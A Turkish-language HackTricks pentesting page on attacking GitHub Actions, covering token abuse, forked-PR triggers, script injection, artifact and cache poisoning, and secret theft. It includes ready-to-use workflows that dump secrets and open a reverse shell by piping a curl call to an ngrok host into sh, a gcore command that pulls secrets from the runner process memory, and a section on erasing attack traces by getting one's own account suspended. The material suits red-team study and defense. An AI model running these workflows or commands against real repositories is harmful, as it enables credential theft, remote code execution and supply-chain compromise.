# Github Actions'ı Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Bu sayfada şunları bulacaksınız:

- Bir saldırganın Github Action'a erişim sağlaması durumunda **tüm etkilerin özeti**
- **Bir action'a erişim sağlama** yolları:
- Action oluşturmak için **izinlere** sahip olmak
- **Pull request** ile ilgili tetikleyicileri kötüye kullanmak
- **Diğer dış erişim** tekniklerini kötüye kullanmak
- Zaten ele geçirilmiş bir repodan **pivotlama**
- Son olarak, **içeriden bir action'ı kötüye kullanma** ile ilgili **post-exploitation teknikleri** hakkında bir bölüm (belirtilen etkileri yaratmak için)

## Etkilerin Özeti

[**Github Actions hakkında temel bilgileri kontrol edin**](../basic-github-information.md#github-actions) için bir giriş.

Eğer bir **repository** içinde **arbitrary code** çalıştırabiliyorsanız, şunları yapabilirsiniz:

- Pipeline'a monte edilmiş **gizli bilgileri çalmak** ve **pipeline'ın ayrıcalıklarını kötüye kullanarak** AWS ve GCP gibi dış platformlara yetkisiz erişim sağlamak.
- **Dağıtımları tehlikeye atmak** ve diğer **artifaktları**.
- Eğer pipeline varlıkları dağıtıyor veya depoluyorsa, nihai ürünü değiştirebilir ve bir tedarik zinciri saldırısına olanak tanıyabilirsiniz.
- **Özel işçilerde kod çalıştırmak**, hesaplama gücünü kötüye kullanmak ve diğer sistemlere pivotlamak.
- `GITHUB_TOKEN` ile ilişkili izinlere bağlı olarak **repository kodunu üzerine yazmak**.

## GITHUB_TOKEN

Bu "**gizli**" ( `${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}`'den gelen) admin bu seçeneği etkinleştirdiğinde verilir:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github Uygulaması'nın** kullanacağı aynı token'dır, bu nedenle aynı uç noktalara erişebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github, bir repo'nun `GITHUB_TOKEN` kullanarak diğer iç repolara erişmesine olanak tanıyan [**flow**](https://github.com/github/roadmap/issues/74) yayınlamalıdır.

Bu token'ın olası **izinlerini** şurada görebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Token'ın **işlem tamamlandıktan sonra süresinin dolduğunu** unutmayın.\
Bu token'lar şu şekilde görünür: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceğiniz bazı ilginç şeyler:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="PR'yi Onayla" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Dikkat edin ki, birkaç durumda **Github Actions ortamlarında veya gizliliklerde github kullanıcı tokenlerini bulabileceksiniz**. Bu tokenler, size depo ve organizasyon üzerinde daha fazla yetki verebilir.

<details>

<summary>Github Action çıktısında gizlilikleri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli anahtarlarla ters shell al</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Github Token'ına verilen izinleri diğer kullanıcıların depolarında **logları kontrol ederek** kontrol etmek mümkündür:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## İzin Verilen Çalıştırma

> [!NOTE]
> Bu, Github eylemlerini tehlikeye atmanın en kolay yolu olacaktır, çünkü bu durum **organizasyonda yeni bir depo oluşturma** erişiminiz olduğunu veya **bir depoda yazma yetkisine** sahip olduğunuzu varsayar.
>
> Bu senaryoda iseniz, [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action) kısmını kontrol edebilirsiniz.

### Depo Oluşturarak Çalıştırma

Bir organizasyonun üyeleri **yeni depolar oluşturabiliyorsa** ve github eylemlerini çalıştırabiliyorsanız, **yeni bir depo oluşturup organizasyon seviyesinde ayarlanan gizli bilgileri çalabilirsiniz**.

### Yeni Bir Dal Üzerinden Çalıştırma

Eğer **zaten bir Github Action** yapılandırılmış bir depoda **yeni bir dal oluşturabiliyorsanız**, onu **değiştirebilir**, içeriği **yükleyebilir** ve ardından **o eylemi yeni dal üzerinden çalıştırabilirsiniz**. Bu şekilde **depo ve organizasyon seviyesindeki gizli bilgileri dışarı sızdırabilirsiniz** (ama bunların nasıl adlandırıldığını bilmeniz gerekir).

Değiştirilen eylemi **manuel olarak** çalıştırabilirsiniz, bir **PR oluşturulduğunda** veya **bazı kodlar yüklendiğinde** (ne kadar dikkat çekmek istediğinize bağlı olarak):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Forked Execution

> [!NOTE]
> Farklı tetikleyiciler, bir saldırganın **başka bir depodaki Github Action'ı çalıştırmasına** izin verebilir. Eğer bu tetiklenebilir eylemler kötü yapılandırılmışsa, bir saldırgan bunları tehlikeye atabilir.

### `pull_request`

**`pull_request`** iş akışı tetikleyicisi, bazı istisnalarla birlikte her seferinde bir pull request alındığında iş akışını çalıştırır: varsayılan olarak, eğer bu sizin **ilk kez** **işbirliği** yapmanızsa, bazı **bakıcıların** iş akışının **çalıştırılmasını** **onaylaması** gerekecektir:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> **Varsayılan kısıtlama** **ilk kez** katkıda bulunanlar içindir, geçerli bir hata/yazım hatasını **düzeltmek** için katkıda bulunabilir ve ardından **yeni `pull_request` ayrıcalıklarınızı kötüye kullanmak için başka PR'lar gönderebilirsiniz**.
>
> **Bunu test ettim ve çalışmıyor**: ~~Başka bir seçenek, projeye katkıda bulunan birinin adını taşıyan bir hesap oluşturmak ve hesabını silmek olurdu.~~

Ayrıca, varsayılan olarak **yazma izinlerini** ve **gizli verilere erişimi** hedef depoya engeller, [**belgelere**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) göre:

> `GITHUB_TOKEN` hariç, **gizli veriler bir iş akışı bir **forked** depodan tetiklendiğinde** çalıştırıcıya **geçmez**. **`GITHUB_TOKEN`'ın pull request'lerde **forked** depolardan yalnızca okuma izinleri vardır**.

Bir saldırgan, Github Action'ın tanımını değiştirerek keyfi şeyler çalıştırabilir ve keyfi eylemler ekleyebilir. Ancak, belirtilen kısıtlamalar nedeniyle gizli verileri çalamaz veya depoyu üzerine yazamaz.

> [!CAUTION]
> **Evet, eğer saldırgan PR'de tetiklenecek github action'ı değiştirirse, onun Github Action'ı kullanılacak ve orijinal depodaki değil!**

Saldırgan ayrıca çalıştırılan kodu kontrol ettiğinden, `GITHUB_TOKEN` üzerinde gizli veriler veya yazma izinleri olmasa bile, bir saldırgan örneğin **kötü niyetli belgeler yükleyebilir**.

### **`pull_request_target`**

**`pull_request_target`** iş akışı tetikleyicisi, hedef depoya **yazma iznine** ve **gizli verilere erişime** sahiptir (ve izin istemez).

**`pull_request_target`** iş akışı tetikleyicisinin **PR tarafından verilen** bağlamda değil, **temel bağlamda** çalıştığını unutmayın (güvenilmeyen kodu **çalıştırmamak için**). `pull_request_target` hakkında daha fazla bilgi için [**belgelere**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) bakın.\
Ayrıca, bu özel tehlikeli kullanım hakkında daha fazla bilgi için bu [**github blog yazısını**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) kontrol edin.

**`pull_request_target`** kullanmanın **güvenli** olduğunu düşündürebilir çünkü **çalıştırılan iş akışı** **temelde** tanımlanmıştır ve **PR'de** değil, ancak bunun **güvenli olmadığı birkaç durum vardır**.

Ve bu, **gizli verilere erişim** sağlayacaktır.

### `workflow_run`

[**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) tetikleyicisi, bir iş akışı `tamamlandığında`, `istek yapıldığında` veya `devam ediyor` olduğunda başka bir iş akışını çalıştırmaya olanak tanır.

Bu örnekte, bir iş akışı, ayrı "Testleri Çalıştır" iş akışı tamamlandıktan sonra çalışacak şekilde yapılandırılmıştır:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ayrıca, belgelerde belirtildiği gibi: `workflow_run` olayıyla başlatılan iş akışı, **önceki iş akışı** çalıştırılmamış olsa bile **gizli bilgilere erişebilir ve token yazabilir**.

Bu tür bir iş akışı, **`pull_request`** veya **`pull_request_target`** aracılığıyla bir dış kullanıcı tarafından **tetiklenebilen** bir **iş akışına** **bağlıysa** saldırıya uğrayabilir. Birkaç savunmasız örnek [**bu blogda**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**bulunabilir.** İlk örnek, **`workflow_run`** tetiklenen iş akışının saldırganın kodunu indirmesidir: `${{ github.event.pull_request.head.sha }}`\
İkinci örnek, **güvenilmeyen** koddan **`workflow_run`** iş akışına bir **artifact** **geçirerek** ve bu artifact'ın içeriğini **RCE'ye karşı savunmasız hale getirecek** bir şekilde kullanmaktır.

### `workflow_call`

TODO

TODO: `pull_request`'tan çalıştırıldığında kullanılan/indirilen kodun orijinalden mi yoksa fork edilmiş PR'den mi olduğunu kontrol et

## Forked Execution'ı Kötüye Kullanma

Bir dış saldırganın bir github iş akışını çalıştırmasını sağlamak için tüm yolları belirttik, şimdi bu çalıştırmaların, kötü yapılandırıldığında, nasıl kötüye kullanılabileceğine bakalım:

### Güvenilmeyen checkout çalıştırması

**`pull_request`** durumunda, iş akışı **PR'nin bağlamında** çalıştırılacak (yani **kötü niyetli PR kodunu** çalıştıracak), ancak birinin önce **yetkilendirmesi** gerekiyor ve bazı [kısıtlamalarla](#pull_request) çalışacak.

**`pull_request_target` veya `workflow_run`** kullanan bir iş akışında, **`pull_request_target` veya `pull_request`** aracılığıyla tetiklenebilen bir iş akışına bağlıysa, orijinal repo kodu çalıştırılacak, bu nedenle **saldırgan çalıştırılan kodu kontrol edemez**.

> [!CAUTION]
> Ancak, eğer **action**'da **açık bir PR checkout** varsa, bu **PR'den kod alacak** (veya temelden değil), saldırganın kontrolündeki kodu kullanacaktır. Örneğin (PR kodunun indirildiği 12. satıra bakın):

<pre class="language-yaml"><code class="lang-yaml"># GÜVENLİ DEĞİL. Sadece bir örnek olarak verilmiştir.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potansiyel olarak **güvenilmeyen kod, `npm install` veya `npm build` sırasında çalıştırılmaktadır** çünkü derleme betikleri ve referans verilen **paketler PR yazarının kontrolündedir**.

> [!WARNING]
> Savunmasız eylemleri aramak için bir github dork'u: `event.pull_request pull_request_target extension:yml` ancak, eylem güvensiz yapılandırılmış olsa bile, işlerin güvenli bir şekilde çalıştırılması için farklı yollar vardır (örneğin, PR'yi oluşturan aktörün kim olduğuna dair koşullu ifadeler kullanmak).

### Bağlam Script Enjeksiyonları <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Belirli [**github bağlamları**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) vardır ki bunların değerleri **PR'yi oluşturan kullanıcı** tarafından **kontrol edilmektedir**. Eğer github action bu **verileri herhangi bir şeyi çalıştırmak için kullanıyorsa**, bu **rastgele kod çalıştırmaya** yol açabilir:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Enjeksiyonu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelerden: Bir iş akışı işinde herhangi bir sonraki adımda kullanılabilir bir **çevre değişkeni** oluşturmak veya güncellemek için bu değişkeni tanımlayarak ve **`GITHUB_ENV`** çevre dosyasına yazarak yapabilirsiniz.

Eğer bir saldırgan bu **env** değişkeninin içine **herhangi bir değer** enjekte edebilirse, **LD_PRELOAD** veya **NODE_OPTIONS** gibi sonraki adımlarda kod çalıştırabilecek env değişkenlerini enjekte edebilir.

Örneğin ([**bu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**bu**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), bir iş akışının **`GITHUB_ENV`** env değişkeninin içeriğini depolamak için yüklenen bir artifact'a güvenmesi durumunu hayal edin. Bir saldırgan bunu tehlikeye atmak için şöyle bir şey yükleyebilir:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Savunmasız Üçüncü Taraf Github Eylemleri

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**bu blog yazısında**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) belirtildiği gibi, bu Github Eylemi farklı iş akışlarından ve hatta depolardan artifact'lara erişim sağlar.

Sorun şu ki, eğer **`path`** parametresi ayarlanmamışsa, artifact mevcut dizine çıkarılır ve daha sonra iş akışında kullanılabilecek veya çalıştırılabilecek dosyaları geçersiz kılabilir. Bu nedenle, eğer Artifact savunmasızsa, bir saldırgan bunu diğer iş akışlarını tehlikeye atmak için kötüye kullanabilir.

Savunmasız bir iş akışı örneği:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu iş akışıyla saldırıya uğrayabilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Diğer Harici Erişim

### Silinmiş Namespace Repo Ele Geçirme

Eğer bir hesap adını değiştirirse, başka bir kullanıcı bir süre sonra o isimle bir hesap kaydedebilir. Eğer bir depo **isim değişikliğinden önce 100 yıldızdan azsa**, Github, aynı isimle yeni kayıtlı kullanıcının **silinenle aynı isimde bir depo oluşturmasına** izin verecektir.

> [!CAUTION]
> Yani eğer bir işlem, var olmayan bir hesaptan bir depoyu kullanıyorsa, bir saldırganın o hesabı oluşturup işlemi tehlikeye atması hala mümkün olabilir.

Eğer diğer depolar **bu kullanıcı depolarından bağımlılıklar** kullanıyorsa, bir saldırgan bunları ele geçirebilir. İşte daha kapsamlı bir açıklama: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivotlama

> [!NOTE]
> Bu bölümde, ilk depoda bir tür erişimimiz olduğunu varsayarak **bir depodan diğerine geçiş yapmamızı** sağlayacak tekniklerden bahsedeceğiz (önceki bölüme bakın).

### Önbellek Zehirleme

Bir önbellek, **aynı dalda workflow çalışmaları arasında** korunur. Bu, bir saldırganın **bir paketi tehlikeye atması** durumunda, bu paketin önbellekte saklanıp **daha ayrıcalıklı** bir workflow tarafından **indirilip** çalıştırılması halinde, o workflow'u da **tehlikeye atabileceği** anlamına gelir.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Zehirleme

Workflow'lar, **diğer workflow'lardan ve hatta depolardan artifact'ler** kullanabilir. Eğer bir saldırgan, başka bir workflow tarafından daha sonra kullanılan bir **artifact'ı yükleyen** Github Action'ı **tehlikeye atmayı** başarırsa, o **diğer workflow'ları da tehlikeye atabilir**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Bir Aşama Sonrası Sömürü

### OIDC Üzerinden AWS ve GCP'ye Erişim

Aşağıdaki sayfalara bakın:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Gizli Bilgilere Erişim <a href="#accessing-secrets" id="accessing-secrets"></a>

Eğer bir script'e içerik enjekte ediyorsanız, gizli bilgilere nasıl erişebileceğinizi bilmek ilginçtir:

- Eğer gizli bilgi veya token bir **çevre değişkenine** ayarlandıysa, **`printenv`** kullanarak çevre üzerinden doğrudan erişilebilir.

<details>

<summary>Github Action çıktısında gizli bilgileri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli anahtarlarla ters shell al</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Eğer gizli bilgi **bir ifadede doğrudan kullanılıyorsa**, oluşturulan shell scripti **diskte** saklanır ve erişilebilir.
- ```bash
cat /home/runner/work/_temp/*
```
- JavaScript eylemleri için gizli bilgiler ortam değişkenleri aracılığıyla gönderilir.
- ```bash
ps axe | grep node
```
- **Özel bir eylem** için, risk, programın elde ettiği gizli bilgiyi **argüman** olarak nasıl kullandığına bağlı olarak değişebilir:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Kendinden Barındırılan Çalıştırıcıları Kötüye Kullanma

**Github Actions'ın non-github altyapısında hangi eylemlerin çalıştırıldığını** bulmanın yolu, Github Action yapılandırma yaml'ında **`runs-on: self-hosted`** aramaktır.

**Kendinden barındırılan** çalıştırıcılar, **ekstra hassas bilgilere**, diğer **ağ sistemlerine** (ağda savunmasız uç noktalar mı? meta veri servisi?) erişim sağlayabilir veya, izolasyon sağlansa bile, **birden fazla eylem aynı anda çalıştırılabilir** ve kötü niyetli olanı diğerinin **gizli bilgilerini çalabilir**.

Kendinden barındırılan çalıştırıcılarda, **\_Runner.Listener**\_\*\* sürecinden gizli bilgileri elde etmek de mümkündür\*\*; bu süreç, bellek dökümü yapılarak herhangi bir adımda iş akışlarının tüm gizli bilgilerini içerecektir:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Daha fazla bilgi için [**bu gönderiyi kontrol edin**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Görüntüleri Kaydı

Github içinde **bir Docker görüntüsü oluşturup depolayacak Github eylemleri** yapmak mümkündür.\
Aşağıdaki genişletilebilir örnekte bir örnek bulabilirsiniz:

<details>

<summary>Github Eylemi Docker Görüntüsü Oluştur ve Yükle</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Önceki kodda görebileceğiniz gibi, Github kayıt defteri **`ghcr.io`** üzerinde barındırılmaktadır.

Repo üzerinde okuma izinlerine sahip bir kullanıcı, kişisel erişim token'ı kullanarak Docker Görüntüsünü indirebilir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Sonra, kullanıcı **Docker imaj katmanlarında sızdırılmış gizli bilgileri** arayabilir:

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions günlüklerinde hassas bilgiler

**Github** gizli değerleri **tespit etmeye** ve **göstermemeye** çalışsa da, eylemin yürütülmesi sırasında üretilmiş **diğer hassas veriler** gizli kalmayacaktır. Örneğin, bir gizli değerle imzalanmış bir JWT, [özellikle yapılandırılmadıkça](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) gizli kalmayacaktır.

## İzlerinizi Kapatma

([**buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) bir teknik) Öncelikle, oluşturulan herhangi bir PR, Github'da ve hedef GitHub hesabında kamuya açık olarak görünür. GitHub'da varsayılan olarak, **internetin PR'sini silemeyiz**, ancak bir twist var. Github tarafından **askıya alınan** hesaplar için, tüm **PR'lar otomatik olarak silinir** ve internetten kaldırılır. Bu nedenle, etkinliğinizi gizlemek için ya **GitHub hesabınızın askıya alınmasını sağlamalı ya da hesabınızın işaretlenmesini** sağlamalısınız. Bu, **tüm etkinliklerinizi** internetten gizleyecektir (temelde tüm istismar PR'larınızı kaldırır).

GitHub'daki bir organizasyon, hesapları GitHub'a bildirmede çok proaktiftir. Tek yapmanız gereken, Issue'da "biraz şey" paylaşmak ve 12 saat içinde hesabınızın askıya alınmasını sağlamak :p ve işte, istismarınızı GitHub'da görünmez hale getirdiniz.

> [!WARNING]
> Bir organizasyonun hedef alındığını anlamanın tek yolu, GitHub günlüklerini SIEM'den kontrol etmektir; çünkü GitHub UI'dan PR kaldırılacaktır.

## Araçlar

Aşağıdaki araçlar, Github Action iş akışlarını bulmak ve hatta savunmasız olanları bulmak için faydalıdır:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{{#include ../../../banners/hacktricks-training.md}}
